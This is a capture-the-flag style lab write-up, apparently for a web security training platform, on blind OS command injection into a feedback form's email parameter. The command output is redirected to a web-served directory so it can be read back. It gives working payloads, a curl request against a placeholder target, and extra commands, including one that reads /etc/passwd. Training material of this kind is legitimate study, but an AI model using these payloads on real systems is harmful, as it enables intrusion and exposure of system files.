# Blind OS command injection with output redirection — Practitioner

**Status:** Solved

---

## Goal

Execute commands and redirect output to a file you can access, since the app doesnt show command results directly.

---

## Steps (simple & complete)

1. **Find injection point**
   - Go to "Submit feedback" form
   - Intercept with Burp Suite
   - Email parameter is vulnerable

2. **Check writable directory**
   - The app serves static files from `/var/www/images/`
   - You can write files there and access them

3. **Inject command with output redirection**
```
   email=x||whoami>/var/www/images/output.txt||
```
   - `>` redirects command output to file

4. **Execute injection**
```bash
   curl -X POST "https://TARGET/feedback/submit" \
     -d "email=x||whoami>/var/www/images/output.txt||&name=test&subject=test&message=test"
```

5. **Read the output file**
   - Browse to:
```
   https://TARGET/image?filename=output.txt
```
   - You'll see the whoami output!

6. **Lab solved**
   - Once you successfully read the command output from the file

---

## Example

**Injection:**
```
email=test||whoami>/var/www/images/result.txt||
```

**Access output:**
```
GET /image?filename=result.txt

Response:
peter-webapp
```

---

## Usefull commands

Extract more info:
```
email=x||cat /etc/passwd>/var/www/images/passwd.txt||
email=x||ls -la>/var/www/images/files.txt||
email=x||id>/var/www/images/id.txt||
```

---

